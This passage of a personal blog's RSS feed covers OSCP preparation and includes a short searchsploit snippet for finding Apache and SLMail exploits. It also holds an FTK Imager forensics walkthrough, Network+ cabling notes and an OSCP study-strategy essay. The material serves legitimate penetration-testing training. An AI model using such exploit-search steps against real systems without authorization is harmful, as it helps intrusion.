+&lt;h3&gt;Safe Metasploit&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;searchsploit apache &lt;span class="m"&gt;2&lt;/span&gt;.4 &lt;span class="p"&gt;|&lt;/span&gt; grep -v &lt;span class="s1"&gt;&amp;#39;/dos/&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;# remove dos attacks&lt;/span&gt;
+searchsploit apache &lt;span class="m"&gt;2&lt;/span&gt;.x &lt;span class="p"&gt;|&lt;/span&gt; grep -v &lt;span class="s1"&gt;&amp;#39;/dos/&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;# generalize&lt;/span&gt;
+searchsploit slmail
+searchsploit x PATH
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Linux Privilege Escalation&lt;/h3&gt;
+&lt;h3&gt;Windows Privilege Escalation&lt;/h3&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Daniel</dc:creator><pubDate>Wed, 30 Oct 2019 00:00:00 -0500</pubDate><guid isPermaLink="false">tag:None,2019-10-30:/oscp-notes-for-exam.html</guid><category>misc</category></item><item><title>"Digital Forensics: Imaging a Windows PC"</title><link>/digital-forensics-imaging-a-windows-pc.html</link><description>&lt;ul&gt;
+&lt;li&gt;Cyber Security
+tags:&lt;/li&gt;
+&lt;li&gt;FTK Imager&lt;/li&gt;
+&lt;li&gt;Windows&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;p&gt;Drive acquisition is one the first steps a Forensic Analyst will have to carry out at the beginning of case. These acquistions are often carried out remotely by VPN or by the the client (or client IT department) where the computer is located. Acquiring such images from a drive has been made easy using AccesData Forensic Toolkit (FTK) Imager. The software is free and can be downloaded &lt;a href="https://accessdata.com/product-download/forensic-toolkit-ftk-version-7.1.0"&gt;here&lt;/a&gt;! &lt;/p&gt;
+&lt;p&gt;Once downloaded, install the software. Launch by doubleclicking the FTK icon or running &lt;code&gt;FTK Imager.exe&lt;/code&gt; from the command line.&lt;/p&gt;
+&lt;p&gt;Let's plug in an external USB drive to write to and image the host, a Windows 10 machine.&lt;/p&gt;
+&lt;p&gt;Here is the main GUI for FTK. Select &lt;code&gt;File&lt;/code&gt; from the menu and &lt;code&gt;Create a Disk Image&lt;/code&gt; and then chose the source of your image&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/assets/images/ftk/ftk1.jpg" title="FTK Imager"&gt;&lt;/p&gt;
+&lt;p&gt;We are imaging a physical drive so selct that option&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/assets/images/ftk/ftk2.jpg" title="FTK Imager, select Physical Drive"&gt;&lt;/p&gt;
+&lt;p&gt;Choose the drive to be imaged&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/assets/images/ftk/ftk3.jpg" title="FTK Imager, chose drive"&gt;&lt;/p&gt;
+&lt;p&gt;Now we need to select the destination (our external USB), to save the image too. We also want to carry out verification on the image to ensure that the copy we have on the USB is identical to the host machine. The image will calculate the MD5 and SHA1 hash values for the host drive ad FTK Image.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/assets/images/ftk/ftk4.jpg" title="FTK Imager"&gt;&lt;/p&gt;
+&lt;p&gt;Next we need to selct the image format type that we will be saving. E01 is a common forensic image file format and is almost a standard. In addition, the E01 file format provides metadata about the image as well as compressing the data meaning you will be handler a smaller file after imaging. &lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/assets/images/ftk/ftk5.jpg" title="FTK Imager"&gt;&lt;/p&gt;
+&lt;p&gt;Select the image destination. The external USB dive is &lt;code&gt;D:&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/assets/images/ftk/ftk6.jpg" title="Select image destination"&gt;&lt;/p&gt;
+&lt;p&gt;Now image!&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/assets/images/ftk/ftk7.jpg" title="Image!"&gt;&lt;/p&gt;
+&lt;p&gt;After imaging the software will jump into the verification process&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/assets/images/ftk/ftk8.jpg" title="Image verification"&gt;&lt;/p&gt;
+&lt;p&gt;FTK Imager also creates a log of the acquisition process and places it in the same directory as the image, image-name.txt. This file lists the evidence information, details of the drive, check sums, and times the image acquisition started and finished:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/assets/images/ftk/ftk9.jpg" title="Image verification"&gt;&lt;/p&gt;
+&lt;p&gt;Once the drive is imaged we are presented with the display that both the MD5 and SHA1 hashes indicate that the drive we just imaged and the image itself match.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/assets/images/ftk/ftk10.jpg" title="Image verification display"&gt;&lt;/p&gt;
+&lt;p&gt;And that's that. Next up, memory dump using FTK Imager&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Daniel</dc:creator><pubDate>Mon, 28 Oct 2019 00:00:00 -0500</pubDate><guid isPermaLink="false">tag:None,2019-10-28:/digital-forensics-imaging-a-windows-pc.html</guid><category>misc</category></item><item><title>"Network+: Cabling &amp; Topology"</title><link>/network-cabling-topology.html</link><description>&lt;ul&gt;
+&lt;li&gt;Network+
+tags:&lt;/li&gt;
+&lt;li&gt;Topology&lt;/li&gt;
+&lt;li&gt;Cabling&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2&gt;Topology&lt;/h2&gt;
+&lt;p&gt;A network topology is defined by the lines and nodes that make up the network. This can be further delineated into two twpes of topology: &lt;code&gt;physical&lt;/code&gt; vs &lt;code&gt;logical&lt;/code&gt; topology.&lt;/p&gt;
+&lt;p&gt;Physical topology is the geometric pattern of the connected nodes of a network, whereas logical topology defines the pattern of data transfer between network nodes.&lt;/p&gt;
+&lt;h3&gt;Physical topologies&lt;/h3&gt;
+&lt;p&gt;&lt;img alt="image" src="/assets/images/network-topology.png" title="A sample of physical network topologies"&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Bus topology (dropdowns)&lt;/li&gt;
+&lt;li&gt;Ring topology (Token ring, developed by IBM)&lt;/li&gt;
+&lt;li&gt;Star topology (rare/old)&lt;/li&gt;
+&lt;li&gt;Hybrid topology (Star-Bus)&lt;/li&gt;
+&lt;li&gt;Mesh topology (Wireless: fully-meshed vs partially-meshed)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;The hybrid star-bus topology is very often implemented... &lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/assets/images/star_network_topology_ani.gif" title="Star-Bus topology"&gt;&lt;/p&gt;
+&lt;h2&gt;Cabling&lt;/h2&gt;
+&lt;h3&gt;Coaxial cabling&lt;/h3&gt;
+&lt;p&gt;Coaxial cable has two conductors. Center copper conductor, second tubular conductor. 
+Common axis as both conductors share same axis, same centerpoint.&lt;/p&gt;
+&lt;p&gt;Radio Grade (RG ratings) defines the thickness ofconductors, insulation and shielding.&lt;/p&gt;
+&lt;p&gt;RG-58 (50 Ohm) Older cable for networking
+BNC Connector&lt;/p&gt;
+&lt;p&gt;RG-59 (75 Ohm) common in cable modems (older)
+Threaded Connector (F-type connector, FC-type connector)&lt;/p&gt;
+&lt;p&gt;RG-6 (75 Ohm) common in cable modems (modern)
+Thicker thab RG-59&lt;/p&gt;
+&lt;h3&gt;Twisted pair cabling&lt;/h3&gt;
+&lt;p&gt;Twisting allows signal to propogate further down a piece of copper wire.
+Unshielded twisted pair (UTP) cabling (no metal protective sheath).&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/assets/images/utp.jpg" title="UTP wire. 4 pairs"&gt;&lt;/p&gt;
+&lt;p&gt;Not strong or durable due to absence of sheath but is very cheap.
+Solid core versus stranded core.
+When used in network environemt it tends to be 4-twisted pairs.
+We use a RJ-45 connector
+Two standards for how the wires are connected to a connector.
+1. EIA/TIA 568A standard
+2. EIA/TIA 568B standard&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/assets/images/tia-eia-568-standards.jpg" title="UTP wire. 4 pairs"&gt;&lt;/p&gt;
+&lt;p&gt;Shielded twisted pair (STP) cabling (metal protective sheath).&lt;/p&gt;
+&lt;h3&gt;Cat Ratings&lt;/h3&gt;
+&lt;p&gt;UTP gas evolved to work for faster and faster network speeds.
+Cat ratings have a different number of twists per inch. Kevlar for pulling.&lt;/p&gt;
+&lt;p&gt;CAT-3 (10 Mbps)
+CAT-5 (100 Mbps, @100m)
+CAT-5e (100-1000 Mbps, @100m)
+CAT-6: (1 Gbps, @100m)
+CAT-6a: (10 Gbps, @100m)
+CAT-7: (10 Gbps, @100m, each pair shielded)&lt;/p&gt;
+&lt;h3&gt;Fiber Optic Cabling&lt;/h3&gt;
+&lt;p&gt;Multi-mode (light from LEDS) cable is mostly orange
+Single mode (lasers) cable is mostly yellow&lt;/p&gt;
+&lt;p&gt;Duplex cables&lt;/p&gt;
+&lt;p&gt;Connectors&lt;/p&gt;
+&lt;h3&gt;Fire ratings&lt;/h3&gt;
+&lt;h3&gt;Legacy Network Connections&lt;/h3&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Daniel</dc:creator><pubDate>Fri, 25 Oct 2019 00:00:00 -0500</pubDate><guid isPermaLink="false">tag:None,2019-10-25:/network-cabling-topology.html</guid><category>misc</category></item><item><title>"Passing the OSCP Exam: Trying Smarter"</title><link>/passing-the-oscp-exam-trying-smarter.html</link><description>&lt;ul&gt;
+&lt;li&gt;Cyber Security
+tags:&lt;/li&gt;
+&lt;li&gt;Penetration Testing&lt;/li&gt;
+&lt;li&gt;OSCP&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The definition of insanity is doing the same thing over and over again, but expecting different results.&lt;/p&gt;
+&lt;p&gt;&lt;cite&gt;Albert Einstein&lt;/cite&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;If, like me, you have no hacking experience and no computer science background you have probably spent time in the Penetration Testing With Kali Linux (PWK) labs proving Einstein's theory of insanity. Presumably, you have searched online as to hints and tips about passing the OSCP. And there are no clear guides as to how to pass the exam with the author's &lt;em&gt;rightly&lt;/em&gt; avoiding spoilers. You've probably also come across the tiresome phrase 'try harder'. Yeah, well that's a given, I'm guessing very few people signed up for Penetration Testing with Kali Linux without conducting some preliminary reseach indicating that the course and OSCP exam would be tough. My background is not computer science and I came at this from the more noob-end of the distribution of OSCP candidates. I have a PhD in Neuroscience, I feel as if I have the ability to learn most things, I believe its all about putting in the time. But, there's a lot of things I want to spend my time on, my time has to be spent efficiently. I did learn a few things on my OSCP journey that, if I'd have known at the start of the course, would have helped me greatly shorten my time to passing the OSCP and reduced the stress levels of doing the coursework/exam. We're all here doing the OSCP because we're prepared to 'try hard' and 'harder'. But let's heed Einstein's advice and try not to scratch around running endless dirbusters and nmap scripts trying to find the answer. Let's 'try smarter'. If I could do it all again I believe I could have been smarter about where I spent my time. I know realise that the PWK learning environment and the OSCP exam are not necessarily complementary. The PWK labs are a poor preparation for the OSCP exam. Maybe everyone else knows this but I didn't. I paid to learn in the PWK labs but the experience in there was very tough for a beginner. For a noob, I think it's much more efficient timewise to do very little time in the PWK labs, switch that time out for guided learning on HackTheBox, and use PWK labs primarily for the Buffer Overflow training prior to exam time. You have to buy PWK learning materials and lab time to take an OSCP exam attempt. Thats the way it is. But, thinking about it as PWK lab-time then OSCP exam isn't necessarly the way you should think about it. I beleive it's more time-efficient to do HackTheBox then OSCP. Let me explain the steps to enlightenment.&lt;/p&gt;
+&lt;h3&gt;1. Dont buy the PWK course straightaway.&lt;/h3&gt;
+&lt;p&gt;I paid for 90 days up front and wasted most of that time confused. In total it took me 5 months (I did 90 days PWK then 45-ish days on HackTheBox). In hindsight, I bet the exam was passable (for me) with the 30 day PWK-purchase after 60 days of HackTheBox. You may be different, you may be better, no problem. But my point here is to explain a way that may help some people shorten there learning period by cutting out the amount of time your in the PWK labs bewildered and lost. So, why does 60 days HackTheBox plus 30 days of PWK beat a pure 90 days of PWK? It's all about the learning process itself. In HackTheBox labs you learn. You have a great study guide for each individual box. In the PWK labs you have some brief introductions to the tools you can use then your left to muddle through. I did it the wrong way around. I bought the PWK time and expected that time to be an ideal learning environment. It isn't. With one exception (Buffer Overflow, which I will address later). 
+When you buy the PWK course you get a pdf and some video content and access to the PWK labs. I had barely used nmap just once or twice on my home network. All the course material was new to me and I had no idea which information was important or not. The course materials are basic introductions to various tools/techniques you can use for penetration testing. After trying to get my head around the dry pdf material I started looking around the lab machines. I wasted so much time trying nmap and various other basic tools like dirbuster. Both these tools are critical for pentesting and passing the OSCP but I just felt like such a chancer when I was using them as I really didn't know how to exploit any findings that I did get from these tools. I was getting annoyed with how stupid I felt. I really needed a higher level overview of what it is to go from from nothing to a rooted box. Then I found HackTheBox. And Ippsec.&lt;/p&gt;
+&lt;h3&gt;2. Get a paid HackTheBox account.&lt;/h3&gt;
+&lt;p&gt;HackTheBox has two tiers. Free and paid (I think about 15 dollars per month). The free tier gives you access to 20 machines. Just think of the HackTheBox free tier as the same as the PWK labs but with less machines. There's no real point in getting the free account. What I needed here was some handholding. What I needed was someone to show me how to hack a machine from start to finish. Then another machine, and another, and so on. Ippsec is that person. The paid tier of HackTheBox gives you access to what are known as &lt;code&gt;retired machines&lt;/code&gt;. Those retired machines have 'walkthroughs' that you can watch either on the HackTheBox website itself or in YouTube (or pdf). The explanations for why each step is carried out are both clear and detailed. As you start to root more and more boxes following Ippsec's walkthroughs then it becomes very clear and obvious that he utilizes a relatively repetive and straight forward pattern to attack a box. Each machine on HackTheBox is also slightly different, so, although you will reuse many methods and tools, each new box you walkthrough you will learn something new. 
+You can just watch the Ippsec HackTheBox videos on Youtube without getting a HackTheBox account. But for the cheapness of a paid account I'd just pull your wallet out, spend the money, and actually hack the boxes yourself (using a Kali VM which you can download from Offensive Security). In addition, you need to make notes on your work. Extensive, searchable notes that you can jump into during the exam as reference material. Furthermore, your note taking process in HackTheBox, and doing the PWK labs, will be the same process you use during the Exam itself as you may jump around from machine to machine and you need to know what you've already done (what scans/vulnerabilities you've already found). 
+A Note on note-taking.
+CherryTree is preinstalled in the Kali VM from Offensive Security. Its simple and you'll pick it up in no time. It's also searchable which is ideal. Here is an snapshot of my CherryTree notes from my HackTheBox work.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/assets/images/htb.png" title="Some of the nodes from my HackTheBox activity"&gt;&lt;/p&gt;
+&lt;p&gt;Yes, thats also a &lt;code&gt;PWK&lt;/code&gt; node at the top for the machines I'd worked on during PWK lab time. Each node in the HTB node is a machine that I walked through with Ippsec's guidance.&lt;/p&gt;
+&lt;p&gt;Finally, it must be noted, we're not just trying to rack up the numbers on how many boxes we rooted. Ippsec's videos are 20-80 minutes on average. In an 8 hour day you can blow though 10-20 of these boxes taking the easiest path and stopping halfway through the video once the box is rooted. And yay, you'll have 10-20 roots in a day. But,sometimes each box has several paths to root and those other paths are described later in the video. You don't know which path will come up in your exam. The first, the second, the third, so watch the whole video. Root the machine using all ways described in the video. What we are trying to do is broaden and deepen our knowledge not just 'get root'.&lt;/p&gt;
+&lt;p&gt;In summary, the OSCP exam doesn't care if you rooted 100 boxes in HackTheBox if you didn't retain any knowledge from it. &lt;/p&gt;
+&lt;p&gt;The goals of using HackTheBox and the accompanying Ippsec videos are:
+1. Understand the techniques used for each root (this takes time)
+2. Make extensive notes on each root (this also takes time)
+3. Use &lt;code&gt;1&lt;/code&gt; and &lt;code&gt;2&lt;/code&gt; in the OSCP exam.&lt;/p&gt;
+&lt;h3&gt;3. Once you've hacked around 40-50 boxes on HackTheBox buy the 30 days PWK course.&lt;/h3&gt;
+&lt;p&gt;You can give the pdf material a once over just for comforts sake. But to be honest it's not that useful. Remember the exception I mentioned earlier... The exception is the Buffer Overflow information. The most important box to root here in the PWK labs is the Buffer Overflow machine. Read the relevant sections in the pdf and watch the videos. Do the Buffer Overflow. Do it again. Do it &lt;strong&gt;again&lt;/strong&gt;. Make a CherryTree note of how you did it. Look into the tools you used to develop the Buffer Overflow. These tools can be studied, they have more options and usefulness than the basic usage taught in the course materials. &lt;/p&gt;
+&lt;p&gt;Why is this machine so important? 
+1. This machine &lt;strong&gt;will&lt;/strong&gt; be in your exam
+2. It is a hefty 25 points in your exam. You only need another 45 points after you nailed this one.
+3. You can learn enough about Buffer Overflow from zero to OSCP-exam-passing ability in a single week. That's one third of your exam points nailed in a week of study.
+4. In the exam, these 25 points can be obtained in less than an hour. Leaving 23 hours to get the other 45 points.&lt;/p&gt;
+&lt;p&gt;Don't do the coursework. I put a lot of time doing the coursework and when I look back, yeah, I guess it was mildly useful, but, it was &lt;strong&gt;not&lt;/strong&gt; as effective as doing HackTheBox machines. I learned more per hour of HackTheBox than I did per hour of coursework. Also, you're a bit in the dark as to how well written the coursework has to be. It appears you need to get all the questions correct for the measley 5 point. For the time you need to put into this effort and the uncertainty that you may miss the odd question (costing you the 5 points), I'd just ditch the coursework entirely.&lt;/p&gt;
+&lt;p&gt;You do have some of your 30 days left (after doing the Buffer Overflow) to play in the PWK labs. This will be similar to the actual exam environment so go ahead and try your HackTheBox skills in the labs. Its also time to schedule your first exam attempt. We will try and pass first time. But it may be a good strategy for you go into the exam chilled out and to use it as a learning experience for your second attempt. Once you've done the exam once, when you sit back and think about the points on offer for each box you can develop some strategies for attacking them second time around.&lt;/p&gt;
+&lt;h3&gt;4. Take the exam early. Most people fail (several times)&lt;/h3&gt;
+&lt;p&gt;The exams are cheap. They are also an intense period of learning (1. How to hack machines and 2. what your second exam attempt will contain).&lt;/p&gt;
+&lt;p&gt;Have your CherryTree notes ready. 
+You CherryTree notes should have:
+1. HackTheBox node stuffed with walkthrough notes on each machine. 
+2. A PWK node with similar. The PWK node should have extensive notes on Buffer Overflow.
+3. Brief summary on each tool or technology you expect to see. Especially with ready-made commands for tools like nmap, dirbuster, gobuster.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/assets/images/cherry_summary.png" title="OSCP exam notes"&gt;&lt;/p&gt;
+&lt;p&gt;If you fail (likely). You will have gained knowledge on:
+1. Oh yeah, the buffer overflow machine is in the exam, it is easy, and its 25 points in the bag in under an hour.
+2. Learn the point-values on offer for the other machines.
+3. If you bag the other easy machine how many point does that get you? How many more machines do you need? So the answer is obvious as to which two machines to spend the majority of your remaining time on.
+4. Work out what the OSCP guys are thinking regards to Metasploit usage in the exam. You can't use it on the Buffer Overflow. You &lt;strong&gt;don't&lt;/strong&gt; wan't to burn its usage on the low value machine. So... that kind of narrows its usage (but thats a good thing as it also narrows your thinking). You can see if Metaploit has a module for the exploits you discover in the exam without using the check function which is banned.&lt;/p&gt;
+&lt;h3&gt;5. Take the exam again.&lt;/h3&gt;
+&lt;p&gt;A note on exam times. This may be very subjective. For exam attempt 1 and 2 I started at 10am and 6am respectively, coming off a normal sleep pattern (7 hours a night). In hindsight, for me, early exam starts were &lt;strong&gt;another&lt;/strong&gt; terrible idea. During both early-start exam attempts I grabbed all low-hanging fruits and used most of my knowledge and skills in the first 6 or so hours. Then you try things over and over again and start banging your head against a light-bulb like a moth. Then it gets to night time... It's in those final 6 or so hours that you need to identify where you've missed the obvious clue for the box(es) your stuck on. You'll have scanned everything, dirbusted the hell out of every directory and you'll be stuck. Stuck and tired. Then you start to get pissed off at sunrise. Stuck, tired and pissed off as the sun comes up. For me, and this is the subjective part, I cannot work effectively 24 hours straight. So, on my final and succesful exam attempt. I had a start time of 6pm. I planned to stop around midnight and sleep for at least 6 hours. This worked &lt;strong&gt;perfectly&lt;/strong&gt;. After 6 hours I had the Buffer Overflow machine, the low value machine and was well into 2 of the other machines. Buuuut, I was due a break. I'd taken all the low hanging fruit. I'd got some huge pointers as to where the initial route into both the boxes I was interested in. I felt good but I knew the longer I delayed going to sleep the more my performance would drop off. Then I'd start worrying that I didn't have time to go asleep if I wasn't making sufficient progress. If I didn't go to sleep then that would make the end of the exam (6pm tomorrow) a time 36 hours after I'd woken up (6am of the current day). If I thought it was hard to work 24 hours straight then no doubt its harder to do after already being awake 12 hours. So, I left my office (where I was doing the exam) and drove home. Even the simple act of leaving my desk helped. The brain gets stuck in these repetitive routines. Taking a break helps get out of these routines. On the drive home, away from my desk I worked out how to get into one of the two boxes I needed. If I could implement my idea and root that box it meant that I was free to use Metaploit on the other one. The next day, after a suprisingly good sleep in the middle of an exam, I arrived at work and immediately got a foothold in box that I'd solved on the drive home. I rooted relatively quickly. I then swicthed to the other box and Metasploited it in a few minutes. That left me about 8 hours to escalate privileges to root on the Metasploited box. I was so relieved I took my foot off the gas a bit and it took me several hours. Then I rooted the box with hours to spare. With the hours spare and the sleep in the middle I maybe only worked for 12 hours.&lt;/p&gt;
+&lt;p&gt;My first exam attempt was off the back of 90 days PWK.
+My second attempt I'd scheduled shortly after the first. As I'd run out of PWK time I'd just discovered HackTheBox and Ippsec. I knew I'd hit a gold mine of useful material. I should have just cancelled the second exam attempt.
+My third attempt was after a month or so of HackTheBox. 
+The attitude was so different for each exam. For the first two attempts I was extrememly negative. i'd put chances at 10%. But on the third attempt I was bristling with confidence. &lt;/p&gt;
+&lt;h3&gt;Passing OSCP in a nutshell:&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;HackTheBox &amp;amp; Ippsec&lt;/li&gt;
+&lt;li&gt;Buffer Overflow&lt;/li&gt;
+&lt;li&gt;A relative disregard for the PWK material and labs (not including Buffer Overflow).&lt;/li&gt;
+&lt;li&gt;CherryTree Notes on HackTheBox and BufferOverflow&lt;/li&gt;
+&lt;li&gt;A later exam start with some planned sleep.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;The OSCP logo of the shadowy suited guy in the doorway that you get on your OSCP card is so lame. &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Daniel</dc:creator><pubDate>Fri, 25 Oct 2019 00:00:00 -0500</pubDate><guid isPermaLink="false">tag:None,2019-10-25:/passing-the-oscp-exam-trying-smarter.html</guid><category>misc</category></item></channel></rss>
